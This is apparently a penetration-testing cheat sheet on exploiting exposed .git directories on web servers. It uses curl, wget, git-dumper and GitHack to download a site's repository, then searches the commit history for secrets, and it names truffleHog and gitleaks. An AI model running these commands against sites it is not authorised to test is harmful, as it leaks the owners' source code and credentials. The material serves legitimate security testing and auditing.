<h1 align="center">.git Folder</h1>

<br>


### Check for Accessibility

```bash
curl -I https://example.com/.git/HEAD
```

<br>

### Download Core Files

```bash
wget https://example.com/.git/config              # Contains remote URLs, user info
wget https://example.com/.git/index               # The staging area for the next commit
wget https://example.com/.git/refs/heads/master   # The commit hash of the main branch
```


<br>
<br>


### git-dumper
- [Repository](https://github.com/arthaud/git-dumper).  

```bash
pip install git-dumper
git-dumper https://example.com/.git/ ./output-folder

# Advanced usage
git-dumper --header "Authorization: Bearer <TOKEN>" https://example.com/.git/ ./dump
```

<br>

### GitHack
- [Repository](https://github.com/lijiejie/GitHack)
  
```bash
python githack.py http://example.com/.git/ 
```


<br>
<br>


### Post-Exploitation Analysis

```bash
cd output-folder
git log --oneline          # View commit history
git diff <commit-hash>     # Show changes made in a commit
git show <commit-hash>     # Show details of a specific commit
grep -r "secret" .         # Search for keywords in the code
```

### Tools

- `truffleHog`: Scans Git history for high-entropy secrets.
- `gitleaks`: A SAST tool for detecting hardcoded secrets in Git repos.


<br>
<br>


### Reconstruct Object Files

Objects (commits, files, etc.) are stored in `.git/objects` with SHA-1 hashes as names and compressed with zlib. You can download 
them manually using a script that parses the `.git/index` file to find all file hashes and then fetch each object from 
`https://target.com/.git/objects/ab/cd...`
